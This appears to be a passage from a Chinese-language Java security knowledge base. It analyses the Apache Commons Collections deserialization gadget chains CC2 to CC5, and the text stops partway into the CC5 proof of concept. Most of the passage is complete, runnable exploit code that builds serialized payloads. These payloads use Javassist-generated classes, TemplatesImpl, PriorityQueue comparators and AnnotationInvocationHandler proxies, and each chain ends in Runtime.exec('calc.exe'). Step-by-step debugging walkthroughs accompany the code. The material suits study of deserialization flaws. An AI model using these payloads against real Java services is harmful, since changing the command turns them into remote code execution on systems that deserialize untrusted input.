只执行赋值操作，在进行赋值操作的时候，comparator为null 在readObject的时候，需要执行compare函数 -> 赋值操作完成之后，序列化时PriorityQueue的comparator不能为null，否则反序列化时comparator就会为空，就不能进入siftDownUsingComparator函数中queue.add(1); queue.add(2); Field field = Class.forName(\"java.util.PriorityQueue\").getDeclaredField(\"comparator\"); field.setAccessible(true); field.set(queue,Tcomparator); 在反序列化的时候，在readObejct函数里，执行heapify函数 我们通过反射设置了comparator为Tcomparator，此时comparator不为null，此时进入siftDownUsingComparator函数 在执行compare函数后，就执行transformer.transform方法，进行链式调用执行 到这里就执行了Runtime.getRuntime.exec(\"calc.exe\") Javassist Javassit字节码编程 介绍 Javassist是一个开源的分析、编辑和创建Java字节码的类库，可以直接编辑和生成Java生成的字节码。 能够在运行时定义新的Java类，在JVM加载类文件时修改类的定义。 Javassist类库提供了两个层次的API，源代码层次和字节码层次。源代码层次的API能够以Java源代码的形式修改Java字节码。字节码层次的API能够直接编辑Java类文件。下面大概讲一下POC中会用到的类和方法： ClassPool ClassPool是CtClass对象的容器，它按需读取类文件来构造CtClass对象，并且保存CtClass对象以便以后使用，其中键名是类名称，值是表示该类的CtClass对象。常用方法： static ClassPool getDefault()：返回默认的ClassPool，一般通过该方法创建我们的ClassPool； ClassPath insertClassPath(ClassPath cp)：将一个ClassPath对象插入到类搜索路径的起始位置； ClassPath appendClassPath：将一个ClassPath对象加到类搜索路径的末尾位置； CtClass makeClass：根据类名创建新的CtClass对象； CtClass get(java.lang.String classname)：从源中读取类文件，并返回对CtClass 表示该类文件的对象的引用； CtClass CtClass类表示一个class文件，每个CtClass对象都必须从ClassPool中获取 常用方法： void setSuperclass(CtClass clazz)：更改超类，除非此对象表示接口； byte[] toBytecode()：将该类转换为类文件； CtConstructor makeClassInitializer()：制作一个空的类初始化程序（静态构造函数）；示例代码 ```java package com.myproject; import javassist.*; public class TestJavassist { public static void createPerson() throws Exception{ //实例化一个ClassPool容器 ClassPool pool = ClassPool.getDefault(); //新建一个CtClass，类名为Cat CtClass cc = pool.makeClass(\"Cat\"); //设置一个要执行的命令 String cmd = \"System.out.println(\\\"javassit_test succes!\\\");\"; //制作一个空的类初始化，并在前面插入要执行的命令语句 cc.makeClassInitializer().insertBefore(cmd); //重新设置一下类名 String randomClassName = \"EvilCat\" + System.nanoTime(); cc.setName(randomClassName); //将生成的类文件保存下来 cc.writeFile(); //加载该类 Class c = cc.toClass(); //创建对象 c.newInstance(); } public static void main(String[] args) throws Exception { createPerson(); } } 新生成的类是这样子的，其中有一块static代码； ![image.png](./Commons Collection2 分析.assets/2023_05_19_10_37_19_Z49RiqS1.png) 当该类被实例化的时候，就会执行static里面的语句； 在ysoserial的cc2中引入了 TemplatesImpl 类来进行承载攻击payload，需要用到javassist； ### POC ```java package com.myproject; import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet; import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl; import javassist.*; import org.apache.commons.collections4.comparators.TransformingComparator; import org.apache.commons.collections4.functors.InvokerTransformer; import java.io.FileInputStream; import java.io.FileOutputStream; import java.io.ObjectInputStream; import java.io.ObjectOutputStream; import java.lang.reflect.Constructor; import java.lang.reflect.Field; import java.util.PriorityQueue; public class TestJavassist { public static void main(String[] args) throws Exception { Constructor constructor = Class.forName(\"org.apache.commons.collections4.functors.InvokerTransformer\").getDeclaredConstructor(String.class); constructor.setAccessible(true); InvokerTransformer transformer = (InvokerTransformer) constructor.newInstance(\"newTransformer\"); TransformingComparator Tcomparator = new TransformingComparator(transformer); PriorityQueue queue = new PriorityQueue(1); ClassPool pool = ClassPool.getDefault(); pool.insertClassPath(new ClassClassPath(AbstractTranslet.class)); CtClass cc = pool.makeClass(\"Cat\"); String cmd = \"java.lang.Runtime.getRuntime().exec(\\\"calc.exe\\\");\"; cc.makeClassInitializer().insertBefore(cmd); String randomClassName = \"EvilCat\" + System.nanoTime(); cc.setName(randomClassName); // cc.writeFile(); cc.setSuperclass(pool.get(AbstractTranslet.class.getName())); byte[] classBytes = cc.toBytecode(); byte[][] targetByteCodes = new byte[][]{classBytes}; TemplatesImpl templates = TemplatesImpl.class.newInstance(); setFieldValue(templates, \"_bytecodes\", targetByteCodes); setFieldValue(templates, \"_name\", \"1\"); setFieldValue(templates, \"_class\", null); Object[] queue_array = new Object[]{templates,1}; Field queue_field = Class.forName(\"java.util.PriorityQueue\").getDeclaredField(\"queue\"); queue_field.setAccessible(true); queue_field.set(queue,queue_array); Field size = Class.forName(\"java.util.PriorityQueue\").getDeclaredField(\"size\"); size.setAccessible(true); size.set(queue,2); Field comparator_field = Class.forName(\"java.util.PriorityQueue\").getDeclaredField(\"comparator\"); comparator_field.setAccessible(true); comparator_field.set(queue,Tcomparator); try{ ObjectOutputStream outputStream = new ObjectOutputStream(new FileOutputStream(\"./cc2.bin\")); outputStream.writeObject(queue); outputStream.close(); ObjectInputStream inputStream = new ObjectInputStream(new FileInputStream(\"./cc2.bin\")); inputStream.readObject(); }catch(Exception e){ e.printStackTrace(); } } public static void setFieldValue(final Object obj, final String fieldName, final Object value) throws Exception { final Field field = getField(obj.getClass(), fieldName); field.set(obj, value); } public static Field getField(final Class clazz, final String fieldName) { Field field = null; try { field = clazz.getDeclaredField(fieldName); field.setAccessible(true); } catch (NoSuchFieldException ex) { if (clazz.getSuperclass() != null) field = getField(clazz.getSuperclass(), fieldName); } return field; } } 由于这个链于第一个payload 不同，在这里我讲解每一段代码的用法 0x1 通过反射实例化InvokerTransformer对象，设置InvokerTransformer的methodName为newTransformer；这里做的目的是为了调用后面我们设置的**TemplatesImpl**的**newTransformer**方法，而这个**Tcomparator**就如第一个poc一样，将进入**comparator.compare()**方法，进行**transform**方法，进而执行**method.invoke(input,this.args)**，为后续做铺垫 Constructor constructor = Class.forName(\"org.apache.commons.collections4.functors.InvokerTransformer\").getDeclaredConstructor(String.class); constructor.setAccessible(true); InvokerTransformer transformer = (InvokerTransformer) constructor.newInstance(\"newTransformer\"); TransformingComparator Tcomparator = new TransformingComparator(transformer); PriorityQueue queue = new PriorityQueue(1); 0x2 这里需要使用javassit对应的代码，为什么要继承AbstractTranslet类？这里为什么要将类转换成byte数据，并且还一定要放置在byte[][]中？ //实例化一个ClassPool容器 ClassPool pool = ClassPool.getDefault(); //向pool容器类搜索路径的起始位置插入AbstractTranslet.class pool.insertClassPath(new ClassClassPath(AbstractTranslet.class)); //新建一个CtClass，类名为Cat CtClass cc = pool.makeClass(\"Cat\"); //设置一个要执行的命令 String cmd = \"java.lang.Runtime.getRuntime().exec(\\\"calc.exe\\\");\"; //制作一个空的类初始化，并在前面插入要执行的命令语句 cc.makeClassInitializer().insertBefore(cmd); //重新设置一下类名，生成的类的名称就不再是Cat String randomClassName = \"EvilCat\" + System.nanoTime(); cc.setName(randomClassName); // cc.writeFile(); //继承AbstractTranslet类 **重点** cc.setSuperclass(pool.get(AbstractTranslet.class.getName())); //将该类转换为字节数组 byte[] classBytes = cc.toBytecode(); //将一维数组classBytes放到二维数组targetByteCodes的第一个元素 byte[][] targetByteCodes = new byte[][]{classBytes}; 在这里因为我们使用的TemplatesImpl，在其对应的_bytecodes参数中，是需要一个二维byte数组，并且在后续需要实例化_bytecodes的时候会检查是否继承了AbstractTranslet类 0x3 在这里通过给实例化的templates中的_bytecodes，_name，_class赋值操作，由于这些参数都是private，只能通过反射赋值，且_bytecodes为javassit动态生成的恶意类，_name可以为任意值，但是不能为空，_class一定为null，为什么要这样，在调试的时候再做解释 TemplatesImpl templates = TemplatesImpl.class.newInstance(); setFieldValue(templates, \"_bytecodes\", targetByteCodes); setFieldValue(templates, \"_name\", \"1\"); setFieldValue(templates, \"_class\", null); public static void setFieldValue(final Object obj, final String fieldName, final Object value) throws Exception { final Field field = getField(obj.getClass(), fieldName); field.set(obj, value); } public static Field getField(final Class clazz, final String fieldName) { Field field = null; try { field = clazz.getDeclaredField(fieldName); field.setAccessible(true); } catch (NoSuchFieldException ex) { if (clazz.getSuperclass() != null) field = getField(clazz.getSuperclass(), fieldName); } return field; } 0x4 第一部分相当于是给queue赋值，相当于执行add操作，第二部分是给queue设置为2，第三部分就是在poc中强调的部分，最后通过反射将comparator绑定到实例化的queue中 Object[] queue_array = new Object[]{templates,1}; Field queue_field = Class.forName(\"java.util.PriorityQueue\").getDeclaredField(\"queue\"); queue_field.setAccessible(true); queue_field.set(queue,queue_array); Field size = Class.forName(\"java.util.PriorityQueue\").getDeclaredField(\"size\"); size.setAccessible(true); size.set(queue,2); Field comparator_field = Class.forName(\"java.util.PriorityQueue\").getDeclaredField(\"comparator\"); comparator_field.setAccessible(true); comparator_field.set(queue,Tcomparator); 0x5 模拟网络传输，执行序列化与反序列化 try{ ObjectOutputStream outputStream = new ObjectOutputStream(new FileOutputStream(\"./cc2.bin\")); outputStream.writeObject(queue); outputStream.close(); ObjectInputStream inputStream = new ObjectInputStream(new FileInputStream(\"./cc2.bin\")); inputStream.readObject(); }catch(Exception e){ e.printStackTrace(); } 分析 在inputStream.readObject()处打断点，跟进直到comparator.compare()方法中 进入comparator.compare() 方法中 在这里可以看到这里会去执行TemplatesImpl.newTransformer()方法 在这里可以看到0x3中说_name可以为任意值，但不能为null，以及_class要为null，因为只有当_class为null，才能执行defineTransletClasses()函数! 进入defineTransletClasses函数，可以看到这个注释，大概意思就是会返回对自定义的类 loader.defineClass(_bytecodes[i]); 将字节数组还原为Class对象 ,_class[0]就是恶意类 这里对比父类是否是AbstractTranslet,这里就解释了0x2中为什么一定要继承AbstractTranslet 如果_transletIndex没有被赋值（初始值为-1）,那么在下面的if语块中就会抛出异常 在这里实例化_class[_transletIndex].newInstance()，也就是我们使用Javassit生成的恶意代码（执行Runtime.getRuntime.exec()) 总结 构造CC2要比CC1更复杂，其中CC2使用TemplatesImpl需要注意 comparator不需要再构造transformerChain，而是需要调用TemplayesImpl的newTransformer方法 恶意类需要继承AbstractTranslet类 对应的参数一定要构造正常 链路为TemplatesImpl.newTransformer -> getTransletInstance() -> defineTransletClasses -> 得到字节数组还原为的Class对象 -> 实例化 最后添加根据ysoserial CC2 的payload，改了一个可用的poc package com.myproject; import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet; import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl; import javassist.CannotCompileException; import javassist.ClassClassPath; import javassist.ClassPool; import javassist.CtClass; import org.apache.commons.collections4.comparators.TransformingComparator; import org.apache.commons.collections4.functors.InvokerTransformer; import java.io.FileInputStream; import java.io.FileOutputStream; import java.io.ObjectInputStream; import java.io.ObjectOutputStream; import java.lang.reflect.Field; import java.util.PriorityQueue; public class yso2CC2 { public static void main(String[] args) throws Exception { InvokerTransformer transformer = new InvokerTransformer(\"toString\", new Class[0], new Object[0]); PriorityQueue queue = new PriorityQueue(2,new TransformingComparator(transformer)); queue.add(1); queue.add(2); setFieldValue(transformer,\"iMethodName\",\"newTransformer\"); ClassPool pool = ClassPool.getDefault(); pool.insertClassPath(new ClassClassPath(AbstractTranslet.class)); CtClass cc = pool.makeClass(\"Cat\"); String cmd = \"java.lang.Runtime.getRuntime().exec(\\\"calc.exe\\\");\"; cc.makeClassInitializer().insertBefore(cmd); String randomClassName = \"EvilCat\" + System.nanoTime(); cc.setName(randomClassName); // cc.writeFile(); cc.setSuperclass(pool.get(AbstractTranslet.class.getName())); byte[] classBytes = cc.toBytecode(); byte[][] targetByteCodes = new byte[][]{classBytes}; TemplatesImpl templates = TemplatesImpl.class.newInstance(); setFieldValue(templates, \"_bytecodes\", targetByteCodes); setFieldValue(templates, \"_name\", \"1\"); Object[] queueArray = (Object[]) getFieldValue(queue, \"queue\"); queueArray[0] = templates; queueArray[1] = 1; try{ ObjectOutputStream outputStream = new ObjectOutputStream(new FileOutputStream(\"./ycc2.ser\")); outputStream.writeObject(queue); outputStream.close(); ObjectInputStream inputStream = new ObjectInputStream(new FileInputStream(\"./ycc2.ser\")); inputStream.readObject(); }catch(Exception e){ e.printStackTrace(); } } public static void setFieldValue(final Object obj, final String fieldName, final Object value) throws Exception { final Field field = getField(obj.getClass(), fieldName); field.set(obj, value); } public static Field getField(final Class clazz, final String fieldName) { Field field = null; try { field = clazz.getDeclaredField(fieldName); field.setAccessible(true); } catch (NoSuchFieldException ex) { if (clazz.getSuperclass() != null) field = getField(clazz.getSuperclass(), fieldName); } return field; } public static Object getFieldValue(final Object obj, final String fieldName) throws Exception { final Field field = getField(obj.getClass(), fieldName); return field.get(obj); } } 参考链接 https://xz.aliyun.com/t/8164 https://xz.aliyun.com/t/10387 Copyright © aaron 2023 all right reserved，powered by Gitbook该文章修订时间： 2023-07-13 15:38:00 "},"知识库/02.JAVA安全/19.CommonsCollections/03.CC3/Commons Collections 3 分析.html":{"url":"知识库/02.JAVA安全/19.CommonsCollections/03.CC3/Commons Collections 3 分析.html","title":"Commons Collections 3 分析","keywords":"","body":"简介 CC3 相当于CC1，CC2的结合，环境依赖需要commons collections 3.1，jdk1.7，以及javasisst 对应的利用链如下： ObjectInputStream.readObject() AnnotationInvocationHandler.readObject() Map(Proxy).entrySet() AnnotationInvocationHandler.invoke() LazyMap.get() ChainedTransformer.transform() ConstantTransformer.transform() InstantiateTransformer.transform() newInstance() TrAXFilter#TrAXFilter() TemplatesImpl.newTransformer() TemplatesImpl.getTransletInstance() TemplatesImpl.defineTransletClasses newInstance() Runtime.exec() 前置知识 CC1 lazymap 分析 CC2 TemplatesImpl 分析 在分析CC3之前需要了解一下新出现的两个类 TrAXFilter 在该类的构造方法中，调用了传入参数的newTransformer()方法，看到这个方法有点熟悉了，可以实例化，并且参数可控 CC2中，就是在InvokerTransformer.transform()中通过反射调用TemplatesImpl.newTransformer()方法，而CC3中，就可以直接使用TrAXFilter来调用newTransformer()方法 InstantiateTransformer 在该类中实现了Transformer，Serializable接口 在它的transform方法中，实现了当传入的input为class时，可以直接获取其对应的构造函数直接实例化并返回 POC package com.myproject; import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet; import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl; import com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter; import javassist.ClassClassPath; import javassist.ClassPool; import javassist.CtClass; import org.apache.commons.collections.Transformer; import org.apache.commons.collections.functors.ChainedTransformer; import org.apache.commons.collections.functors.ConstantTransformer; import org.apache.commons.collections.functors.InstantiateTransformer; import org.apache.commons.collections.map.LazyMap; import javax.xml.transform.Templates; import java.io.FileInputStream; import java.io.FileOutputStream; import java.io.ObjectInputStream; import java.io.ObjectOutputStream; import java.lang.annotation.Retention; import java.lang.annotation.Target; import java.lang.reflect.*; import java.util.HashMap; import java.util.Map; public class TestCC3 { public static void main(String[] args) throws Exception { ClassPool pool = ClassPool.getDefault(); pool.insertClassPath(new ClassClassPath(AbstractTranslet.class)); CtClass cc = pool.makeClass(\"Cat\"); String cmd = \"java.lang.Runtime.getRuntime().exec(\\\"calc.exe\\\");\"; cc.makeClassInitializer().insertBefore(cmd); String randomClassName = \"EvilCat\" + System.nanoTime(); cc.setName(randomClassName); cc.setSuperclass(pool.get(AbstractTranslet.class.getName())); // cc.writeFile(); byte[] classBytes = cc.toBytecode(); byte[][] targetByteCodes = new byte[][]{classBytes}; TemplatesImpl templates = TemplatesImpl.class.newInstance(); setFieldValue(templates, \"_bytecodes\", targetByteCodes); setFieldValue(templates, \"_name\", \"1\"); Transformer[] transformers = new Transformer[] { new ConstantTransformer(TrAXFilter.class), new InstantiateTransformer(new Class[]{Templates.class}, new Object[]{templates}) }; ChainedTransformer transformerChain = new ChainedTransformer(transformers); Map innerMap = new HashMap(); Map lazyMap = LazyMap.decorate(innerMap, transformerChain); Class cls = Class.forName(\"sun.reflect.annotation.AnnotationInvocationHandler\"); Constructor constructor = cls.getDeclaredConstructor(Class.class, Map.class); constructor.setAccessible(true); InvocationHandler handler = (InvocationHandler) constructor.newInstance(Target.class, lazyMap); Map proxyMap = (Map) Proxy.newProxyInstance(Map.class.getClassLoader(), new Class[] {Map.class}, handler); handler = (InvocationHandler) constructor.newInstance(Target.class, proxyMap); try{ FileOutputStream fileOutputStream = new FileOutputStream(\"payload3.ser\"); ObjectOutputStream objectOutputStream = new ObjectOutputStream(fileOutputStream); objectOutputStream.writeObject(handler); FileInputStream fileInputStream = new FileInputStream(\"payload3.ser\"); ObjectInputStream objectInputStream = new ObjectInputStream(fileInputStream); objectInputStream.readObject(); }catch (Exception e){ e.printStackTrace(); } } public static void setFieldValue(final Object obj, final String fieldName, final Object value) throws Exception { final Field field = getField(obj.getClass(), fieldName); field.set(obj, value); } public static Field getField(final Class clazz, final String fieldName) { Field field = null; try { field = clazz.getDeclaredField(fieldName); field.setAccessible(true); } catch (NoSuchFieldException ex) { if (clazz.getSuperclass() != null) field = getField(clazz.getSuperclass(), fieldName); } return field; } } 分析 0x1 与CC2 相同，通过javasisst动态创建一个类，这个类里包括static代码，只要实例化这个类就能执行static里的代码，最后将该类转换成字节码存储在byte[][]这个二维数组中，在CC2 中可以知道这个字节码是被用来存储在private byte[][] _bytecodes这个二维数组中被实例化的 ClassPool pool = ClassPool.getDefault(); pool.insertClassPath(new ClassClassPath(AbstractTranslet.class)); CtClass cc = pool.makeClass(\"Cat\"); String cmd = \"java.lang.Runtime.getRuntime().exec(\\\"calc.exe\\\");\"; cc.makeClassInitializer().insertBefore(cmd); String randomClassName = \"EvilCat\" + System.nanoTime(); cc.setName(randomClassName); cc.setSuperclass(pool.get(AbstractTranslet.class.getName())); // cc.writeFile(); byte[] classBytes = cc.toBytecode(); byte[][] targetByteCodes = new byte[][]{classBytes}; TemplatesImpl templates = TemplatesImpl.class.newInstance(); setFieldValue(templates, \"_bytecodes\", targetByteCodes); setFieldValue(templates, \"_name\", \"1\"); public static void setFieldValue(final Object obj, final String fieldName, final Object value) throws Exception { final Field field = getField(obj.getClass(), fieldName); field.set(obj, value); } public static Field getField(final Class clazz, final String fieldName) { Field field = null; try { field = clazz.getDeclaredField(fieldName); field.setAccessible(true); } catch (NoSuchFieldException ex) { if (clazz.getSuperclass() != null) field = getField(clazz.getSuperclass(), fieldName); } return field; } 0x2 第二步同CC1的LazyMap 利用链，不过这里的Transformer[]中，ConstantTransformer的构造函数传入的TrAXFilter.class，而这个类构造函数接收的_templates参数，也就是我们在第一步中构造的_templates实例，当调用(TransformerImpl) templates.newTransformer();的时候，就会调用我们构造的恶意类的static方法 Transformer[] transformers = new Transformer[] { new ConstantTransformer(TrAXFilter.class), new InstantiateTransformer(new Class[]{Templates.class}, new Object[]{templates}) }; ChainedTransformer transformerChain = new ChainedTransformer(transformers); Map innerMap = new HashMap(); Map lazyMap = LazyMap.decorate(innerMap, transformerChain); Class cls = Class.forName(\"sun.reflect.annotation.AnnotationInvocationHandler\"); Constructor constructor = cls.getDeclaredConstructor(Class.class, Map.class); constructor.setAccessible(true); InvocationHandler handler = (InvocationHandler) constructor.newInstance(Target.class, lazyMap); Map proxyMap = (Map) Proxy.newProxyInstance(Map.class.getClassLoader(), new Class[] {Map.class}, handler); handler = (InvocationHandler) constructor.newInstance(Target.class, proxyMap); 而怎么才能调用(TransformerImpl) templates.newTransformer();呢，这个时候就要用InstantiateTransformer了，InstantiateTransformer，前置知识中提到了该类实现了Transformer，Serializable接口，当传入的input为class时，可以直接获取其对应的构造函数直接实例化并返回 那么当链式调用的时候，传入input是TrAXFilter，在对其进行实例化的时候，我们已经通过InstantiateTransformer(new Class[]{Templates.class}, new Object[]{templates})构造函数，已经将iParamTypes，iArgs传入，其中iParamTypes = Templates.class, iArgs = javasisst创建的恶意类，在实例化的时候 0x3 LazyMap get()方法调用了transform()方法，factory参数就是传入的transformerChain，达到了代码2的条件 0x4 还是P牛那句话： 如果将AnnotationInvocationHandler对象用Proxy进行代理，那么在readObject的时候，只要调用任意方法，就会进入到AnnotationInvocationHandler#invoke方法中，进而触发我们的LazyMap#get。 AnnotationInvocationHandler是调用处理器，outerMap是被代理的对象，只要调用了LazyMap中的任意方法，就会触发AnnotationInvocationHandler中的invoke方法； 而在readObject方法中调用了entrySet()方法，所以触发invoke 这样就基本上达到了执行命令所需要的条件。 调试 this.memberValues参数值为LazyMap，调用了它的entrySet方法，触发到invoke方法 跟进到ChainedTransformer.transform()，对transformers[]数组进行循环; 第一轮循环，iTransformers[0]参数值为ConstantTransformer，进入它的transform方法，返回TrAXFilter类 第二轮循坏，iTransformers[1]参数值为InstantiateTransformer，TrAXFilter作为参数传入transform方法； 在getConstructor(iParamTypes)中，iParamTypes参数为Templates类，获取到构造函数为TrAXFilter，且在实例化的时候，需要传递Templates类型的参数，iargs则是我们构造的对应的Templates类实例（templates），在实例化过程中，再调用TransformerImpl的newTransformer()； 方法； 实例化_class[_transletIndex]，该参数的值就为EvilCat9080096364400() 最后命令执行成功 参考链接 https://xz.aliyun.com/t/10454#toc-1 Copyright © aaron 2023 all right reserved，powered by Gitbook该文章修订时间： 2023-07-13 15:39:09 "},"知识库/02.JAVA安全/19.CommonsCollections/04.CC4/Commons Collections 4 分析.html":{"url":"知识库/02.JAVA安全/19.CommonsCollections/04.CC4/Commons Collections 4 分析.html","title":"Commons Collections 4 分析","keywords":"","body":"简介 CC4 相当于 CC2 + CC3 的结合，在ysoseria中CC4提及的是，Variation on CommonsCollections2 that uses InstantiateTransformer instead of InvokerTransformer. 也就是说CC4 只需要在CC2的基础上（javassist）将InvokerTransformer修改成InstantiateTransformer,InstantiateTransforme 在CC3中可以知道，实现了Transformer，Serializable接口，在它的transform方法中，实现了当传入的input为class时，可以直接获取其对应的构造函数直接实例化并返回，要达到使用InstantiateTransforme 的transform方法，这时又离不开TrAXFilter的构造函数，在其实例化之后就能调用TransformerImpl的newTransformer方法，最后实现调用恶意代码 前置知识 Commons Collections2 分析 Commons Collections3 分析 环境 jdk1.8 commons collections4利用链 ObjectInputStream.readObject() PriorityQueue.readObject() ... TransformingComparator.compare() ChainedTransformer.transform() ConstantTransformer.transform() InstantiateTransformer.transform() newInstance() TrAXFilter#TrAXFilter() TemplatesImpl.newTransformer() TemplatesImpl.getTransletInstance() TemplatesImpl.defineTransletClasses newInstance() Runtime.exec() POC ```java package com.myproject; import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet; import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl; import com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter; import javassist.ClassClassPath; import javassist.ClassPool; import javassist.CtClass; import org.apache.commons.collections4.Transformer; import org.apache.commons.collections4.comparators.TransformingComparator; import org.apache.commons.collections4.functors.ChainedTransformer; import org.apache.commons.collections4.functors.ConstantTransformer; import org.apache.commons.collections4.functors.InstantiateTransformer; import javax.xml.transform.Templates; import java.io.FileInputStream; import java.io.FileOutputStream; import java.io.ObjectInputStream; import java.io.ObjectOutputStream; import java.lang.reflect.Field; import java.util.PriorityQueue; public class TestCC4 { public static void main(String[] args) throws Exception{ PriorityQueue queue = new PriorityQueue(1); ClassPool pool = ClassPool.getDefault(); pool.insertClassPath(new ClassClassPath(AbstractTranslet.class)); CtClass cc = pool.makeClass(\"cat\"); String cmd = \"java.lang.Runtime.getRuntime().exec(\\\"calc.exe\\\");\"; cc.makeClassInitializer().insertBefore(cmd); String randomClassName = \"EvilCat\" + System.nanoTime(); cc.setName(randomClassName); cc.setSuperclass(pool.get(AbstractTranslet.class.getName())); byte[] classBytes = cc.toBytecode(); byte[][] taegetClassBytes = new byte[][]{classBytes}; TemplatesImpl templates = TemplatesImpl.class.newInstance(); Field field = templates.getClass().getDeclaredField(\"_bytecodes\"); field.setAccessible(true); field.set(templates,taegetClassBytes); Field field1 = templates.getClass().getDeclaredField(\"_name\"); field1.setAccessible(true); field1.set(templates,\"123\"); Transformer[] transformers = new Transformer[]{ new ConstantTransformer(TrAXFilter.class), new InstantiateTransformer(new Class[]{Templates.class}, new Object[]{templates}) }; ChainedTransformer chain = new ChainedTransformer(transformers); queue.add(1); queue.add(1); TransformingComparator Tcomparator = new TransformingComparator(chain); Field comparator_field = PriorityQueue.class.getDeclaredField(\"comparator\"); comparator_field.setAccessible(true); comparator_field.set(queue,Tcomparator); try{ FileOutputStream fileOutputStrem = new FileOutputStream(\"cc4.ser\"); ObjectOutputStream outputStream = new ObjectOutputStream(fileOutputStrem); outputStream.writeObject(queue); FileInputStream fileInputStream = new FileInputStream(\"cc4.ser\"); ObjectInputStream inputStream = new ObjectInputStream(fileInputStream); inputStream.readObject(); }catch(Exception e){ e.printStackTrace(); } } } ![image.png](Commons Collections4 分析.assets/2023_05_19_10_37_25_uGqCkxoU.png) ## 分析 ### 0x1 ```java PriorityQueue queue = new PriorityQueue(1); CC2中我们可以知道，为什么明明PriorityQueue的构造函数中可以传入TransformingComparator的实例，但是我们却不使用可以传入TransformingComparator实例的构造方法，因为在传入之后，会直接调用TransformingComparator实例的方法，导致在还没有序列化的时候程序就已经crash了，这一步是实现CC2，CC4的关键 0x2 通过javasisst创建恶意代码，并将恶意代码写入到TemplatesImpl实例化后的_bytecodes,_name参数中，详情看Commons Collections3 分析 ClassPool pool = ClassPool.getDefault(); pool.insertClassPath(new ClassClassPath(AbstractTranslet.class)); CtClass cc = pool.makeClass(\"cat\"); String cmd = \"java.lang.Runtime.getRuntime().exec(\\\"calc.exe\\\");\"; cc.makeClassInitializer().insertBefore(cmd); String randomClassName = \"EvilCat\" + System.nanoTime(); cc.setName(randomClassName); cc.setSuperclass(pool.get(AbstractTranslet.class.getName())); byte[] classBytes = cc.toBytecode(); byte[][] taegetClassBytes = new byte[][]{classBytes}; TemplatesImpl templates = TemplatesImpl.class.newInstance(); Field field = templates.getClass().getDeclaredField(\"_bytecodes\"); field.setAccessible(true); field.set(templates,taegetClassBytes); Field field1 = templates.getClass().getDeclaredField(\"_name\"); field1.setAccessible(true); field1.set(templates,\"123\"); 0x3 ChainedTransformer类会把我们的Transformer变成一个串，用于执行transform方法链式调用transformers[] 给队列赋值 Transformer[] transformers = new Transformer[]{ new ConstantTransformer(TrAXFilter.class), new InstantiateTransformer(new Class[]{Templates.class}, new Object[]{templates}) }; ChainedTransformer chain = new ChainedTransformer(transformers); queue.add(1); queue.add(1); 0x4 当赋值操作完成之后，再对comparator进行赋值操作，这样就能在赋值操作前不直接crash掉，并且在反序列化的时候comparator不为空，又能直接调用transform方法 TransformingComparator Tcomparator = new TransformingComparator(chain); Field comparator_field = PriorityQueue.class.getDeclaredField(\"comparator\"); comparator_field.setAccessible(true); comparator_field.set(queue,Tcomparator); 调试 在调试过程中，前部分同CC2，一直到comparator.compare(),comparator为反射传入的Tcomparator，当调用compare方法时，就会执行this.transformer.transform(obj1),最后就回直接到TraXFilter的构造函数里，执行newTransformer 最后在getTransletInstance函数里，将传入的字节码实例化 Copyright © aaron 2023 all right reserved，powered by Gitbook该文章修订时间： 2023-07-13 15:39:29 "},"知识库/02.JAVA安全/19.CommonsCollections/05.CC5/Commons Collections 5 分析.html":{"url":"知识库/02.JAVA安全/19.CommonsCollections/05.CC5/Commons Collections 5 分析.html","title":"Commons Collections 5 分析","keywords":"","body":"简介 CC5 利用的还是CC1的链路，使用LazyMap，只要调用了LazyMap.get()，就可以触发ChainedTransformer，链式调用，那么在CC5中，在哪儿会调用这个get方法呢？ 在CC1 LazyMap 利用链中，我们知道动态代理对象调用任何一个方法时会调用handler中的invoke方法，然而我们知道sun.reflect.annotation.AnnotationInvocationHandler，会发现实际上这个类就是一个InvocationHandlerAnnotationInvocationHandler类，如果将这个恶意对象用Proxy进行代理，那么在readObject的时候，只要调用任意方法，就会进入到AnnotationInvocationHandler#invoke方法中。 在CC5中这里引入了新的两个类，分别是TiedMapEntry，BadAttributeValueExpException TiedMapEntry 可以看到map，和key都是可控的，在调用getValue的时候，就直接调用get方法，实现LazyMap#get() 那么要在哪里调用这个getvalue函数呢，在TiedMapEntry里，我们可以看到该类为其实现了一个toString()方法 那么找到能调用TiedMapEntry#toString()方法就显得至关重要，接下来BadAttributeValueExpException类就会带来一片光明 BadAttributeValueExpException BadAttributeValueExpexception 在readObject的时候，如果能读这个valObj为TiedMapEntry的实例，那么是不是就是一条完美的链路？ 在此处，我们可以看到BadAttributeValueExpexception 的构造函数只有一个值val，但是类型是Object，那么我们可以按如下构造，当其反序列化的时候，调用readObject()函数的时候，反序列化得到的valObj就是对应的TiedMapEntry实例 // 创建一个实例 BadAttributeValueExpException val = new BadAttributeValueExpException(null); // 反射赋值 Field valfield = val.getClass().getDeclaredField(\"val\"); valfield.setAccessible(true); valfield.set(val,\"TiedMapEntry实例对象\"); POC package com.myproject; import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet; import javassist.ClassClassPath; import javassist.ClassPool; import javassist.CtClass; import org.apache.commons.collections.Transformer; import org.apache.commons.collections.functors.ChainedTransformer; import org.apache.commons.collections.functors.ConstantTransformer; import org.apache.commons.collections.functors.InvokerTransformer; import org.apache.commons.collections.keyvalue.TiedMapEntry; import org.apache.commons.collections.map.LazyMap; import javax.management.BadAttributeValueExpException; import java.io.FileInputStream; import java.io.FileOutputStream; import java.io.ObjectInputStream; import java.io.ObjectOutputStream; import java.lang.reflect.Field; import java.util.HashMap; import java.util.Map; /* @params Test Env jdk8u181 Commons Collection3.1 */ public class TestCC5 { public static void main(String[] args) throws Exception { Transformer[] transformers = new Transformer[]{ new ConstantTransformer(Runtime.class), new InvokerTransformer(\"getMethod\", new Class[]{String.class, Class[].class}, new Object[]{\"getRuntime\", new Class[0]}), new InvokerTransformer(\"invoke\", new Class[]{Object.class, Object[].class}, new Object[]{null, new Object[0]}), new InvokerTransformer(\"exec\", new Class[]{String.class}, new Object[]{\"calc.exe\"}) }; Transformer transformerChain = new ChainedTransformer(transformers); Map innerMap = new HashMap(); Map 